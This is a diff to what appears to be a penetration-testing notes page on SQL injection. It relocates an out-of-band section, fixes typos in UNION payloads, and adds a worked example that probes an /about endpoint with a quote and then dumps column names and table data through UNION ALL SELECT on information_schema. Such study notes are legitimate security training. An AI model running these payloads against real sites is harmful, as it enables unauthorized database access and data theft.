@@ -6,6 +6,15 @@ Refers to the same method of communication being used to exploit the vulnerabili
 
 
 
+## Out Of Band
+
+Depends on DB feature of making some kind of external network call based on the results from an SQL query. Is classified by having two different communication channels:&#x20;
+
+* One to launch the attack  where SQLi is made to send a query.
+* Other to gather the results intercepting response from a DB.
+
+
+
 ## Error-Based
 
 Obtaining information about the database structure as error messages from the database are printed directly to the browser screen.
@@ -31,7 +40,7 @@ $url/query?$column=$value UNION SELECT 1,2,3 #Try Until theres no message error
 
 * Change query value
 
-<pre class="language-sql" data-overflow="wrap" data-line-numbers><code class="lang-sql"><strong>$url/query?$column=$changedvalue SELECT UNION $found
+<pre class="language-sql" data-overflow="wrap" data-line-numbers><code class="lang-sql"><strong>$url/query?$column=$changedvalue UNION SELECT $found
 </strong><strong>#Change until no results are shown to determine value
 </strong></code></pre>
 
@@ -82,8 +91,60 @@ $url/query?$column=$changedvalue UNION $found,group_concat(colum_name) FROM info
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```sql
-0 UNION SELECT 1,2,group_concat($value1,$value2) FROM $table
+0 UNION SELECT 1,2,group_concat($value1,$value2) FROM $tablefound
 #Obtain values from the table we needed
+```
+{% endcode %}
+
+***
+
+***
+
+***
+
+* Check if  vulnerable by sending a malformed petition with '
+
+{% code overflow="wrap" lineNumbers="true" %}
+```sql
+"GET /about/2' HTTP/1.1"
+#We obtain a 500 error and this code
+<code>SELECT firstName, lastName, pfpLink, role, bio FROM $tablename WHERE id = 2'</code>
+```
+{% endcode %}
+
+***
+
+* As we know the number of columns, we make union to select the _column\_name_ parameter and leave the other columns as null for avoiding error. Then we obtain info from the default db _information\_schema_ and select the _column_ parameter specifying the name of the table we need
+
+{% code overflow="wrap" lineNumbers="true" %}
+```sql
+#Make the petition to an unvalid value (-1) for avoiding displaying an entry of the database instead of the column name
+/about/-1 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name='$tablename'
+
+ About | id None #The result obtained in the response
+```
+{% endcode %}
+
+***
+
+* Use _group\_concat()_ to get all columns
+
+{% code overflow="wrap" lineNumbers="true" %}
+```sql
+/about/-1 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name='$tablename'
+
+About | id,firstName,lastName,pfpLink,role,shortRole,bio,$columname None #The result obtained in the response
+```
+{% endcode %}
+
+***
+
+* Obtain required information from the table
+
+{% code overflow="wrap" lineNumbers="true" %}
+```sql
+/about/-1 UNION ALL SELECT $columname,null,null,null,null FROM $tablename WHERE id = 1
+#The response is the information tha we were looking for
 ```
 {% endcode %}
 
@@ -264,11 +325,3 @@ $url/query?$column=$changedvalue' UNION SELECT SLEEP($time),$found FROM $table_f
 
 ***
 
-##
-
-## Out Of Band
-
-Depends on DB feature of making some kind of external network call based on the results from an SQL query. Is classified by having two different communication channels:&#x20;
-
-* One to launch the attack  where SQLi is made to send a query.
-* Other to gather the results intercepting response from a DB.
